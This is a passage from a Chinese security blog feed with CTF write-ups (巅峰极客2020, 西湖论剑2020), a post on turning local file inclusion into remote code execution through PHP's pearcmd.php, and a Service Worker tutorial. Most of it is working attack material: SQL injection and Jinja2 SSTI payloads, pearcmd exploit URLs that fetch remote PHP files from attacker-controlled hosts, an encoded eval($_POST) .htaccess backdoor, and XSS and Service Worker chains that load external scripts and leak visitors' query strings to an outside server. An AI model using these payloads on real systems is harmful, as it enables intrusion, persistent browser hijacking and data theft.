- /admin/?/login[12:31:50] 200 -   38B  - /admin/index.php[12:31:57] 200 -   48B  - /check.php[12:32:13] 200 -   33B  - /robots.txt[12:41:07] 200 -   29B  - /admin/.bowerrc[12:41:26] 301 -  185B  - /admin/assets  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/assets/[12:41:28] 200 -    1KB - /admin/bower.json[12:41:38] 301 -  185B  - /admin/images  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/images/[12:41:39] 200 -   38B  - /admin/index.php[12:41:57] 200 -  620B  - /admin/package.json</code></pre><p>check.php 过滤了： </p><pre><code>&quot;,&#39;,-,=,;,select</code></pre><pre><code>username=aaaa\&amp;password= /sleep(5)%23bbbb</code></pre><p>存在sql注入</p><pre><code>账号密码adminuAreRigHt</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020155506.png" alt="image2642"></p><pre><code>EVAL($COMMAND.&quot;=FALSE&quot;);过滤：;,&quot;,&#39;, ,|,`,^,\,;,/,*,(,),&amp;,$,#,f,F</code></pre><p>任意文件包含：</p><pre><code>POST /admin/ HTTP/1.1Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.comCache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5Connection: closeContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryrD05yt5mContent-Length: 161------WebKitFormBoundaryrD05yt5mContent-Disposition: form-data; name=&quot;command&quot;?&gt;&lt;?=include&lt;&lt;&lt;DDDD.bowerrcDDDD?&gt;------WebKitFormBoundaryrD05yt5m--</code></pre><p>读取flag</p><pre><code>POST /admin/ HTTP/1.1Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.comCache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 89command=%3f%3e%3c%3f%3dinclude%7e%3c%3c%3cDDDD%0d%0a%D0%99%93%9E%98%0d%0aDDDD%0d%0a%3f%3e</code></pre><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p><code>GET /loged?name=%7B%7B2*2%7D%7D</code><br>存在SSTI<br>模板引擎jinja2</p><pre><code>http://eci-2ze3domag0jprtzax0lx.cloudeci1.ichunqiu.com:8888/loged?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__==%27_IterationGuard%27%20%}{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27cat%20/flag%27).read()%22)%20}}{%%20endif%20%}{%%20endfor%20%}</code></pre><p>拿flag</p><h2 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h2><p>任意文件读取</p><p>hint:register_argc_argv</p><pre><code>register_argc_argv    TRUE    由于该设置为 TRUE，将总是可以在 CLI SAPI 中访问到 argc（传送给应用程序参数的个数）和 argv（包含有实际参数的数组）。对于 PHP 4.3.0，在使用 CLI SAPI 时，PHP 变量 $argc 和 $argv 已被注册并且设定了对应的值。而在这之前的版本，这两个变量在 CGI 或者 模块 版本中的建立依赖于将 PHP 的设置选项 register_globals 设为 on。除了版本和 register_globals 设定以外，可以随时通过调用 $_SERVER 或者 $HTTP_SERVER_VARS 来访问它们。例如：$_SERVER[&#39;argv&#39;]</code></pre><p><a href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/" target="_blank" rel="noopener">https://khack40.info/camp-ctf-2015-trolol-web-write-up/</a></p><p>找到一个类似的题目，但是他们是用变量覆盖来执行</p><p>阅读pearcmd的代码发现：<code>if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;]))</code></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200926190107.png" alt="image6158"></p><pre><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?list+install+--installroot+/tmp/+http://ccreater.top:60006/install.php++++++++++++++$&amp;f=pearcmd&amp;</code></pre><p>后面多余部分并不影响我们下载恶意文件</p><p><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?f=/tmp/tmp/pear/download/install</code></p><p>任意命令执行</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/20/巅峰极客2020wp/">https://www.ccreater.top/2020/10/20/巅峰极客2020wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LFI利用php自带的pearcmd.php直接RCE</title>
      <link href="2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/"/>
      <url>2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="LFI利用php自带的pearcmd-php直接RCE"><a href="#LFI利用php自带的pearcmd-php直接RCE" class="headerlink" title="LFI利用php自带的pearcmd.php直接RCE"></a>LFI利用php自带的pearcmd.php直接RCE</h1><p>在做巅峰极客的一题时，用到了包含pearcmd.php从而RCE的点（perlcmd.php也是一样的），今天来研究一下这个点</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>阅读pearcmd.php中关于参数产生的那部分代码发现：</p><pre><code class="php">...if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;])) {    echo &#39;ERROR: either use the CLI php executable, &#39; .         &#39;or set register_argc_argv=On in php.ini&#39;;    exit(1);}$argv = Console_Getopt::readPHPArgv();...array_shift($argv);//这里删除了第一个argv，通常argv[0]是程序名...</code></pre><p><code>Getopt.php:readPHPArgv</code></p><pre><code class="php">    public static function readPHPArgv()    {        global $argv;        if (!is_array($argv)) {            if (!@is_array($_SERVER[&#39;argv&#39;])) {                if (!@is_array($GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;])) {                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);                }                return $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;];            }            return $_SERVER[&#39;argv&#39;];        }        return $argv;    }</code></pre><p>我们发现这里的参数是从<code>$_SERVER[&#39;argv&#39;]</code>（旧版本的就是：<code>$GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code>）中获取的</p><p>我们来测试一下<code>$_SERVER[&#39;arvg&#39;]</code>,测试代码：<code>var_dump($_SERVER[&#39;argv&#39;]);</code></p><p>访问<a href="http://127.0.0.1:60080/?1+2+3+4+%20+%dd" target="_blank" rel="noopener">http://127.0.0.1:60080/?1+2+3+4+%20+%dd</a></p><pre><code>/var/www/html/index.php:4:array (size=6)  0 =&gt; string &#39;1&#39; (length=1)  1 =&gt; string &#39;2&#39; (length=1)  2 =&gt; string &#39;3&#39; (length=1)  3 =&gt; string &#39;4&#39; (length=1)  4 =&gt; string &#39;%20&#39; (length=3)  5 =&gt; string &#39;%dd&#39; (length=3)</code></pre><p>在$_SERVER[‘argv’]中的所有url编码都不会被解析，只是当成普通字符串，而+会被解析成参数的分隔符</p><p>于是我们便可以像在命令行一样调用pearcmd.php了，接下来就变成了利用pearcmd这个命令getshell，直接命令行尝试（太懒了）</p><p>查看pearcmd.php的帮助：<code>php pearcmd.php [options] command [command-options] &lt;parameters&gt;</code>，那么我们传参就得变成</p><p><code>url/?+[options]+command+[command-options]+&lt;parameters&gt;</code>，?后面必须跟一个+号让其作为$argv[0],这里要注意+号的数量，因为这是拿来作为分隔符的如：<code>?++</code>就会被解析成<code>[&quot;&quot;,&quot;&quot;,&quot;&quot;]</code></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020153757.png" alt="image1911"></p><ol><li>register_argc_argv=On（默认是开的）</li><li>包含pearcmd.php或者peclcmd.php</li></ol><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>这里直接给出payload，都是直接看帮助写出来的，没啥好说的。</p><p>exp1:</p><p>需要出网</p><pre><code>http://192.168.43.230:60080/?+install+--installroot+/tmp/+http://ccreater.top:60006/evil.php++++++++++++++$&amp;f=pearcmd.php&amp;#把GET参数都塞到最后面http://192.168.43.230:60080/?f=/tmp/tmp/pear/download/install.php</code></pre><p>exp2:</p><p>需要出网</p><p>会下载到当前文件夹</p><pre><code>http://192.168.43.230:60080/?+download+https://fuckyou.free.beeceptor.com/fuckyou.php+&amp;f=pearcmd.php#都塞到最后面http://192.168.43.230:60080/?f=fuckyou.php</code></pre><p>exp3:</p><pre><code class="php">http://192.168.43.230:60080/?+config-create+/&lt;?=phpinfo();?&gt;/*+/var/www/html/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php#把GET参数都塞到路径中，这里可以用url编码来防止空格,/等对文件生成造成影响的字符http://192.168.43.230:60080/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php</code></pre><p>exp4:</p><p><strong>最好用</strong></p><pre><code>http://192.168.43.230:60080/?+-c+/var/www/html/config2.php+-d+man_dir=&lt;?phpinfo();?&gt;/*+-s+list&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM#参数塞到最后面http://192.168.43.230:60080/config2.php</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/20/LFI利用php自带的pearcmd.php直接RCE/">https://www.ccreater.top/2020/10/20/LFI利用php自带的pearcmd.php直接RCE/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> LFI </tag>
            
            <tag> php </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020西湖论剑</title>
      <link href="2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
      <url>2020/10/15/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
      
        <content type="html"><![CDATA[<h1 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h1><h2 id="NewUpload"><a href="#NewUpload" class="headerlink" title="NewUpload"></a>NewUpload</h2><p>hint:<br>我装了宝塔 waf，apache 环境，自己本地配一套这种环境就知道怎么弄了。<br>看看宝塔自己装的 apache 有什么东西？</p><p>%00干掉宝塔waf</p><p>任意文件上传过滤php关键字<br>上传.htaccess绕过<br>普通的payload并不适用与php-fpm通信<br>在<code>/www/server/panel/vhost/apache</code>下发现php的解析方式</p><pre><code> #PHP    &lt;FilesMatch \.php$&gt;            SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;    &lt;/FilesMatch&gt;</code></pre><p>直接设置<code>SetHandler &quot;proxy:unix:/tmp/php-cgi-74.sock|fcgi://localhost&quot;</code>，访问我们上传的后门并不行，查了下资料发现php-fpm有security.limit_extensions限制了php脚本的后缀名，它的默认值是:<code>.php .phar</code></p><p>所以我们上传phar文件getshell,getshell后发现，我们需要readflag而，命令执行函数都被干掉了，php版本是php 7.4.10</p><pre><code>passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</code></pre><p>把<a href="https://github.com/Explorersss/exploits中的脚本试过一边后都不行" target="_blank" rel="noopener">https://github.com/Explorersss/exploits中的脚本试过一边后都不行</a></p><p>但是这里php-fpm服务是通过socket文件通信的，我们可以直接打php-fpm绕过disable function</p><p><a href="https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php" target="_blank" rel="noopener">https://gist.githubusercontent.com/Explorersss/452ba2ed228dee841ac474b5d96f1581/raw/dc35576e0a4448b33da381fd2980d586aedc4e01/bypass_disable_function_by_fpm.php</a></p><h2 id="easyjson"><a href="#easyjson" class="headerlink" title="easyjson"></a>easyjson</h2><pre><code class="php">&lt;?phpinclude &#39;security.php&#39;;if(!isset($_GET[&#39;source&#39;])){    show_source(__FILE__);    die();}$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;var_dump($sandbox);if(!file_exists($sandbox)){    mkdir($sandbox);    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);}$action = $_GET[&#39;action&#39;];$content = file_get_contents(&quot;php://input&quot;);if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){    $content = json_decode($content);    $filename = $_GET[&#39;filename&#39;];    $filecontent = $content-&gt;content;    $filename = $sandbox.$filename;    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);}elseif($action == &quot;reset&quot;){    $files = scandir($sandbox);    foreach($files as $file) {        if(!is_dir($file)){            if($file !== &quot;index.php&quot;){                unlink($sandbox.$file);            }        }    }}else{    die(&#39;Security Check Failed.&#39;);}</code></pre><pre><code>POST /?source=1&amp;action=write&amp;filename=index.php HTTP/1.1Host: easyjson.xhlj.wetolink.comPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 439{&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u0070\u0068\u0070\u005f\u0076\u0061\u006c\u0075\u0065\u0020\u0061\u0075\u0074\u006f\u005f\u0070\u0072\u0065\u0070\u0065\u006e\u0064\u005f\u0066\u0069\u006c\u0065\u0020\u0022\u002e\u0068\u0074\u0061\u0063\u0063\u0065\u0073\u0073\u0022\u000a\u0023\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;}</code></pre><p>flag{a5db5397505f825334aa4dfc17d3bb9f}</p><h2 id="hardxss"><a href="#hardxss" class="headerlink" title="hardxss"></a>hardxss</h2><p>在登入接口发现如下代码：</p><pre><code class="javascript">callback = &quot;get_user_login_status&quot;;        auto_reg_var();        if(typeof(jump_url) == &quot;undefined&quot; || /^\//.test(jump_url)){            jump_url = &quot;/&quot;;        }        jsonp(&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot; + callback,function(result){            if(result[&#39;status&#39;]){                location.href = jump_url;            }        })        function jsonp(url, success) {            var script = document.createElement(&quot;script&quot;);            if(url.indexOf(&quot;callback&quot;) &lt; 0){                var funName = &#39;callback_&#39; + Date.now() + Math.random().toString().substr(2, 5);                url = url + &quot;?&quot; + &quot;callback=&quot; + funName;            }else{                var funName = callback;            }            window[funName] = function(data) {                success(data);                delete window[funName];                document.body.removeChild(script);            }            script.src = url;            document.body.appendChild(script);        }        function auto_reg_var(){            var search = location.search.slice(1);            var search_arr = search.split(&#39;&amp;&#39;);            for(var i = 0;i &lt; search_arr.length; i++){                [key,value] = search_arr[i].split(&quot;=&quot;);                window[key] = value;            }        }</code></pre><p>利用jsonp任意xss</p><p>view-source:<a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//ffffuck.free.beeceptor.com/%22)</a>;</p><p>利用Service Workers从xss.hardxss.xhlj.wetolink.com移动到auth.hardxss.xhlj.wetolink.com</p><p><a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//" target="_blank" rel="noopener">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%22//abcde.free.beeceptor.com/2%22);//</a></p><p>2:</p><pre><code class="javascript">document.domain=&quot;hardxss.xhlj.wetolink.com&quot;;a=document.createElement(&quot;iframe&quot;);a.src=&quot;https://auth.hardxss.xhlj.wetolink.com&quot;;document.body.append(a);document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})function fuck(){    var code = `navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#39;//serviceworker.free.beeceptor.com/exp.js&#39;);//&quot;)`;    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);}</code></pre><p>/:</p><pre><code class="javascript">self.addEventListener(&#39;fetch&#39;, function(event) {  event.respondWith(new Response(&#39;&lt;html&gt;&lt;script&gt;document.location.href=&quot;http://ccreater.top:60000/?&quot;+document.location.search&lt;/script&gt;&lt;/html&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));});</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222800.png" alt="image5725"></p><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201015222516.png" alt="image5832"></p><p>详细说明见：<a href="http://blog.ccreater.top/2020/10/15/Service%20Worker/" target="_blank" rel="noopener">http://blog.ccreater.top/2020/10/15/Service%20Worker/</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/10/15/2020西湖论剑/">https://www.ccreater.top/2020/10/15/2020西湖论剑/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Service Worker</title>
      <link href="2020/10/15/Service%20Worker/"/>
      <url>2020/10/15/Service%20Worker/</url>
      
        <content type="html"><![CDATA[<h1 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h1><h2 id="Service-Worker-学习"><a href="#Service-Worker-学习" class="headerlink" title="Service Worker 学习"></a>Service Worker 学习</h2><h3 id="配置检查"><a href="#配置检查" class="headerlink" title="配置检查"></a>配置检查</h3><p>在已经支持 serivce workers 的浏览器的版本中，很多特性没有默认开启。如果你发现示例代码在当前版本的浏览器中怎么样都无法正常运行，你可能需要开启一下浏览器的相关配置：</p><ul><li><strong>Firefox Nightly</strong>: 访问 <code>about:config</code> 并设置 <code>dom.serviceWorkers.enabled</code> 的值为 true; 重启浏览器；</li><li><strong>Chrome Canary</strong>: 访问 <code>chrome://flags</code> 并开启 <code>experimental-web-platform-features</code>; 重启浏览器 (注意：有些特性在Chrome中没有默认开放支持)；</li><li><strong>Opera</strong>: 访问 <code>opera://flags</code> 并开启<code>ServiceWorker 的支持</code>; 重启浏览器。 </li></ul><p>另外，你需要通过 HTTPS 来访问你的页面 — 出于安全原因，<strong>Service Workers 要求必须在 HTTPS 下才能运行。Github 是个用来测试的好地方，因为它就支持HTTPS。为了便于本地开发，<code>localhost</code> 也被浏览器认为是安全源。</strong></p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ol><li>Service Workers 要求必须在 HTTPS 或者 localhost 下才能运行</li><li>Service Workers 要求尽可能的异步操作</li></ol><h3 id="Service-Workers-的注册及安装"><a href="#Service-Workers-的注册及安装" class="headerlink" title="Service Workers 的注册及安装"></a>Service Workers 的注册及安装</h3><p>通过<code>serviceWorkerContainer.register()</code>来注册一个Service Workers</p><p>eg.</p><pre><code class="javascript">if (&#39;serviceWorker&#39; in navigator) {  navigator.serviceWorker.register(&#39;/sw-test/sw.js&#39;, { scope: &#39;/sw-test/&#39; }).then(function(reg) {    // registration worked    console.log(&#39;Registration succeeded. Scope is &#39; + reg.scope);  }).catch(function(error) {    // registration failed    console.log(&#39;Registration failed with &#39; + error);  });}</code></pre><p>其中scope为Service Workers的作用域，默认是scriptURL(<code>/sw-test/sw.js</code>)所在的文件夹及其子文件夹，scope的选择范围只能是scriptURL所在的文件夹或者子文件夹，且不能影响其他网站，只能影响当前的域名。</p><p>scriptURL是相对于origin的URL而不是相对于引用他的那个JS文件，当然也有例外（ <code>Content-Type</code> 必须是 <code>text/javascript</code>）</p><blockquote><p>如果你的 service worker 被激活在一个有 <code>Service-Worker-Allowed</code> header 的客户端，你可以为service worker 指定一个最大的 scope 的列表。</p></blockquote><p>安装过程：</p><p><img src="https://mdn.mozillademos.org/files/12636/sw-lifecycle.png" alt="image1496"></p><h3 id="处理事件"><a href="#处理事件" class="headerlink" title="处理事件"></a>处理事件</h3><p>Service Workers支持的事件如下</p><p><img src="https://mdn.mozillademos.org/files/12632/sw-events.png" alt="image1603"></p><p>install:安装时会触发InstallEvent</p><p>activate:安装事件之后调用activate事件</p><p>fetch:Service Workers 中的所有请求都会触发fetch事件</p><p>sync:当发起一个同步请求是会触发sync事件</p><pre><code class="javascript">this.addEventListener(&#39;install&#39;, function(event) {  event.waitUntil(    caches.open(&#39;v1&#39;).then(function(cache) {      return cache.addAll([        &#39;/sw-test/&#39;,        &#39;/sw-test/index.html&#39;,        &#39;/sw-test/style.css&#39;,        &#39;/sw-test/app.js&#39;,        &#39;/sw-test/image-list.js&#39;,        &#39;/sw-test/star-wars-logo.jpg&#39;,        &#39;/sw-test/gallery/&#39;,        &#39;/sw-test/gallery/bountyHunters.jpg&#39;,        &#39;/sw-test/gallery/myLittleVader.jpg&#39;,        &#39;/sw-test/gallery/snowTroopers.jpg&#39;      ]);    })  );});self.addEventListener(&#39;activate&#39;, function(event) {  var cacheWhitelist = [&#39;v2&#39;];  event.waitUntil(    caches.keys().then(function(keyList) {      return Promise.all(keyList.map(function(key) {        if (cacheWhitelist.indexOf(key) === -1) {          return caches.delete(key);        }      }));    })  );});self.addEventListener(&#39;fetch&#39;, function(event) {  event.respondWith(    caches.match(event.request).then(function(resp) {      return resp || fetch(event.request).then(function(response) {        return caches.open(&#39;v1&#39;).then(function(cache) {          cache.put(event.request, response.clone());          return response;        });        });    })  );});</code></pre><h2 id="Service-Worker-With-XSS"><a href="#Service-Worker-With-XSS" class="headerlink" title="Service Worker With XSS"></a>Service Worker With XSS</h2><h3 id="XSS简单示范"><a href="#XSS简单示范" class="headerlink" title="XSS简单示范"></a>XSS简单示范</h3><p>通过Service Worker 可以持久的控制受害者</p><p>利用条件如下：</p><ol><li>一个xss点</li><li>MIME TYPE 为 application/javascript的可控页面（通常是jsonp）</li></ol><p><code>index.php?xss=navigator.serviceWorker.register(&quot;/sw/jsonp.php?xss=importScripts(%27https://serviceworker.free.beeceptor.com/exp.js%27);&quot;);</code></p><p>exp.js</p><pre><code>self.addEventListener(&#39;fetch&#39;, function(event) {  event.respondWith(new Response(&#39;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));});</code></pre><h3 id="利用Service-Workers-控制主站及其子站点"><a href="#利用Service-Workers-控制主站及其子站点" class="headerlink" title="利用Service Workers 控制主站及其子站点"></a>利用Service Workers 控制主站及其子站点</h3><p>假设在A.evil.com上存在XSS点，B.evil.com上存在可控jsonp，</p><p>那么我们可以通过设置<code>document.domain=&quot;evil.com&quot;</code>，嵌入一个iframe（src=B.evil.com），然后执行恶意代码插入Service Workers</p><p>A站点执行(使用self.skipWaiting()使的Service Workes 控制当前界面)</p><pre><code class="javascript">document.domain=&quot;evil.com&quot;;a=document.createElement(&quot;iframe&quot;);a.src=&quot;https://B.evil.com/&quot;;document.body.append(a);document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})function fuck(){    var code = `navigator.serviceWorker.register(&quot;/jsonp.php?callback=self.importScripts(&#39;//mysite.com/fuck.js&#39;)//&quot;)`;    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);}</code></pre><p>这样我们便控制住了B站点</p><p>fuck.js</p><pre><code class="javascript">document.domain=&quot;hardxss.xhlj.wetolink.com&quot;;a=document.createElement(&quot;iframe&quot;);a.src=&quot;https://auth.hardxss.xhlj.wetolink.com&quot;;document.body.append(a);document.getElementsByTagName(&quot;iframe&quot;)[0].addEventListener(&quot;load&quot;,()=&gt;{fuck()})function fuck(){    var code = `navigator.serviceWorker.register(&quot;/api/loginStatus?callback=self.importScripts(&#39;//serviceworker.free.beeceptor.com/exp.js&#39;);//&quot;)`;    document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.eval(code);}</code></pre><p>exp.js</p><pre><code>self.addEventListener(&#39;fetch&#39;, function(event) {  event.respondWith(new Response(&#39;&lt;h1 style=&quot;color:red&quot;&gt;HACKED&lt;/h1&gt;&#39;,{headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }}));});</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>教程：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p><p>API：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a></p><p><a href="https://lightless.me/archives/XSS-With-Service-Worker.html" target="_blank" rel="noopener">https://lightless.me/archives/XSS-With-Service-Worker.html</a></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://www.ccreater.top/2020/10/15/Service">https://www.ccreater.top/2020/10/15/Service</a> Worker/](<a href="https://www.ccreater.top/2020/10/15/Service">https://www.ccreater.top/2020/10/15/Service</a> Worker/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> js </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
